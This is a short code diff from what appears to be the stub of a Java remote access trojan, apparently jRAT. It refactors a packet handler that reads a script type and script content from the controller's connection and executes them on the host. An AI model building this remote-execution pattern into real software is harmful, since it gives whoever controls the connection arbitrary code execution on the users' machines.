@@ -1,6 +1,6 @@
 package se.jrat.stub.packets.incoming;
 
-import se.jrat.common.script.Script;
+import se.jrat.common.script.AbstractScript;
 import se.jrat.stub.Connection;
 
 public class Packet35Script extends AbstractIncomingPacket {
@@ -10,7 +10,7 @@ public class Packet35Script extends AbstractIncomingPacket {
 		String type = Connection.readLine();
 		String content = Connection.readLine();
 		
-		Script script = Script.getScript(type);
+		AbstractScript script = AbstractScript.getScript(type);
 		script.setContent(content);
 		script.perform();
 	}
